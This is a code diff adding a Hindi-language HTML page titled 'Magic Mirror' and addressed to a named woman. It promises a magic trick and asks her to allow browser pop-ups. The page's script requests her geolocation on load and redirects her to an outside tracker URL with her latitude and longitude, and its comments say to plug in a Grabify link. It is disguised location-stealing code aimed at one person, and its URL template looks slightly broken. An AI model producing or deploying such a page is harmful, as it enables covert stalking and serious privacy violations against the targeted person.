@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Magic Mirror ✨</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e1e2f, #2a2a40);
+            color: #ffffff;
+            text-align: center;
+            padding: 50px 20px;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            box-sizing: border-box;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            color: #ff79c6;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 18px;
+            color: #f8f8f2;
+            line-height: 1.6;
+        }
+        .magic-btn {
+            background: linear-gradient(90deg, #ff79c6, #bd93f9);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 18px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-top: 20px;
+            box-shadow: 0 4px 15px rgba(255, 121, 198, 0.4);
+            transition: 0.3s;
+        }
+        .magic-btn:hover {
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Hii Shivani Ji 👋</h1>
+        <p>आपको एक मैजिक दिखाता हूँ! ✨</p>
+        <p style="font-size: 14px; color: #6272a4;">(मैजिक लोड करने के लिए कृपया स्क्रीन पर आने वाले पॉप-अप को <b>Allow/Ok</b> करें)</p>
+        <button class="magic-btn" onclick="startMagic()">मैजिक देखें 🔮</button>
+    </div>
+
+    <script>
+        // यह फंक्शन पेज लोड होते ही या बटन क्लिक करने पर लोकेशन एक्सेस मांगेगा
+        function startMagic() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                alert("Oops! आपका ब्राउज़र मैजिक सपोर्ट नहीं करता।");
+            }
+        }
+
+        // जैसे ही वह Allow करेंगी, यह फंक्शन काम करेगा
+        function showPosition(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+            
+            // यहाँ हम डेटा को ग्रैबिफाई या अपने ट्रैकर पर भेजने के लिए लिंक को रीडायरेक्ट कर देंगे
+            // [مهم] 'YOUR_TRACKING_URL' की जगह अपनी ग्रैबिफाई लिंक डालनी होगी
+            window.location.href = `https://imageshare.best{lat}&lon=${lon}`;
+        }
+
+        function showError(error) {
+            alert("मैजिक देखने के लिए लोकेशन Permission को Allow करना ज़रूरी है! कृपया पेज रिफ्रेश करें।");
+        }
+
+        // पेज खुलते ही प्रॉम्ट दिखाने के लिए
+        window.onload = function() {
+            setTimeout(startMagic, 1000);
+        };
+    </script>
+
+</body>
+</html>
